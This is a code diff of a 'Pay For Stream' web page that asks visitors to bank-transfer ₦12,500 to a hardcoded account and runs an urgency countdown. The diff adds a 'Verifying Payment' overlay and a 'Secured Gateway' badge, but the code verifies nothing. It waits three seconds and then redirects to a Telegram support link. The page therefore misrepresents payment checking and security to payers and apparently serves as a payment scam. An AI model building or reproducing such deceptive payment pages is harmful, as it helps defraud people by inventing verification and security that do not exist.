@@ -48,41 +48,59 @@
             margin-bottom: 25px;
         }
 
-        /* Hide content until Firebase data is ready to prevent "Old Data" flicker */
         #main-content { opacity: 0; transition: opacity 0.5s ease; }
         #main-content.ready { opacity: 1; }
         
-        #loader {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-weight: 800; color: #d4f000; font-size: 14px; text-transform: uppercase;
+        #loader, #verifying-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #0b0e14; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 9999;
         }
+
+        #verifying-overlay { background: rgba(11, 14, 20, 0.95); display: none; }
+
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid rgba(212, 240, 0, 0.1);
+            border-left-color: #d4f000; border-radius: 50%; animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body class="p-5 flex flex-col items-center min-h-screen">
 
-    <div id="loader">Syncing Secure Gateway...</div>
+    <div id="loader">
+        <div class="spinner mb-4"></div>
+        <div class="font-black text-[#d4f000] text-xs uppercase tracking-widest">Syncing Gateway...</div>
+    </div>
+
+    <div id="verifying-overlay">
+        <div class="spinner mb-4"></div>
+        <div class="text-white font-bold text-lg mb-1">Verifying Payment</div>
+        <div class="text-gray-500 text-sm">Please do not close this window...</div>
+    </div>
 
     <div id="main-content" class="w-full max-w-md">
         <div class="flex justify-center mb-6 mt-4">
             <div class="w-16 h-16 bg-[#d4f000] rounded-full flex items-center justify-center">
-                <i class="fas fa-dollar-sign text-3xl text-black"></i>
+                <i class="fas fa-bolt text-3xl text-black"></i>
             </div>
         </div>
 
         <div class="text-center mb-6">
             <h1 class="text-3xl font-extrabold mb-1">Pay For Stream</h1>
-            <p class="text-gray-400 text-sm">Proceed to your bank app to complete this transaction.</p>
+            <p class="text-gray-400 text-sm">Transfer to the account below to activate.</p>
         </div>
 
         <div class="text-center mb-6">
-            <p class="text-red-500 font-bold text-xs tracking-widest uppercase">
-                <i class="fas fa-exclamation-triangle"></i> NOTE: DO NOT PAY WITH OPAY / PALMPAY
+            <p class="text-red-500 font-bold text-[10px] tracking-widest uppercase">
+                <i class="fas fa-exclamation-triangle"></i> NOTE: NO OPAY / PALMPAY
             </p>
         </div>
 
         <div class="audio-container">
             <div class="flex items-center justify-center gap-2 mb-3 neon-yellow font-bold text-[10px] uppercase tracking-widest">
-                <i class="fas fa-volume-up"></i> Listen To : HOW IT'S WORK'S 
+                <i class="fas fa-volume-up"></i> Listen To Instructions
             </div>
             <audio controls class="w-full h-10">
                 <source src="instruction.mp3" type="audio/mpeg">
@@ -110,26 +128,24 @@
 
             <div class="input-card border-2 border-[#d4f000]/40 mt-4 bg-[#1c2533]">
                 <div class="flex flex-col">
-                    <span class="neon-yellow text-[10px] font-black uppercase tracking-tighter">Amount to Pay</span>
+                    <span class="neon-yellow text-[10px] font-black uppercase tracking-tighter">Exact Amount</span>
                     <span id="amount" class="text-3xl font-black neon-yellow">₦12,500</span>
                 </div>
                 <button onclick="copyData('amount')"><i class="far fa-copy neon-yellow text-xl"></i></button>
             </div>
         </div>
 
-        <div class="mt-8 flex items-center justify-between px-2">
-            <div>
-                <p class="text-gray-500 text-[10px] font-bold uppercase">Details Expire In</p>
-                <p id="timer" class="text-2xl font-black neon-yellow">59:59</p>
-            </div>
-            <div class="text-right">
-                <i class="fas fa-shield-check text-[#d4f000] text-xl"></i>
-                <p class="text-white text-[9px] font-bold uppercase">Secured</p>
+        <div class="mt-8 text-center bg-black/20 py-4 rounded-xl border border-white/5">
+            <p class="text-gray-500 text-[11px] font-bold uppercase tracking-wider mb-1">This payment details will expire in</p>
+            <p id="timer" class="text-3xl font-black neon-yellow tracking-widest">59:59</p>
+            <div class="mt-2 inline-flex items-center gap-2 bg-[#d4f000]/10 px-3 py-1 rounded-full">
+                <i class="fas fa-shield-check text-[#d4f000] text-[10px]"></i>
+                <span class="text-[#d4f000] text-[9px] font-black uppercase">Secured Gateway</span>
             </div>
         </div>
 
-        <button onclick="confirmPayment()" class="w-full bg-neon mt-8 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl active:scale-95 transition-all">
-            I HAVE PAID
+        <button id="pay-btn" onclick="handlePaymentClick()" class="w-full bg-neon mt-8 py-5 rounded-2xl font-black text-lg uppercase shadow-2xl active:scale-95 transition-all flex items-center justify-center gap-3">
+            I HAVE PAID <i class="fas fa-arrow-right"></i>
         </button>
 
         <p class="mt-10 text-gray-600 text-[11px] font-bold uppercase tracking-widest text-center">
@@ -155,26 +171,21 @@
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
         const db = getFirestore(app);
-        let redirectUrl = "https://t.me/stream_support";
+        let redirectBase = "https://t.me/stream_support";
 
         async function connect() {
             try {
                 await signInAnonymously(auth);
-                // The key fix: Listen specifically for server updates to avoid old data
                 onSnapshot(doc(db, 'system', 'payment_details'), { includeMetadataChanges: true }, (snap) => {
                     if(snap.exists()){
-                        // Only hide loader and show content once we have data
                         const d = snap.data();
-                        
-                        // If it's the first load OR data is from server, update the UI
                         if (!snap.metadata.fromCache || snap.metadata.hasPendingWrites === false) {
                             document.getElementById('acc-num').innerText = d.accNum || "8052839670";
                             document.getElementById('bank-name').innerText = d.bank || "Moniepoint MFB";
                             document.getElementById('acc-name').innerText = d.name || "V Media Limited";
                             document.getElementById('amount').innerText = d.amount ? `₦${d.amount}` : "₦12,500";
-                            redirectUrl = d.link || redirectUrl;
+                            redirectBase = d.link || redirectBase;
 
-                            // Show the UI and hide loader
                             document.getElementById('loader').style.display = 'none';
                             document.getElementById('main-content').classList.add('ready');
                         }
@@ -187,12 +198,29 @@
         window.copyData = (id) => {
             const text = document.getElementById(id).innerText.replace('₦','').replace(',','');
             navigator.clipboard.writeText(text);
-            alert("Copied to clipboard");
+            alert("Copied: " + text);
         };
 
-        window.confirmPayment = () => { window.location.href = redirectUrl; };
+        window.handlePaymentClick = () => {
+            const overlay = document.getElementById('verifying-overlay');
+            const btn = document.getElementById('pay-btn');
+            
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Processing...`;
+            overlay.style.display = 'flex';
 
-        // Timer Logic
+            const amount = document.getElementById('amount').innerText;
+            const bank = document.getElementById('bank-name').innerText;
+            const accNum = document.getElementById('acc-num').innerText;
+            
+            const message = `Hello Stream Support, I have just made a payment of ${amount} to ${bank} (${accNum}). Please verify my access.`;
+            const encodedMsg = encodeURIComponent(message);
+            
+            setTimeout(() => {
+                window.location.href = `${redirectBase}?text=${encodedMsg}`;
+            }, 3000);
+        };
+
         let seconds = 3600;
         setInterval(() => {
             const m = Math.floor(seconds / 60);
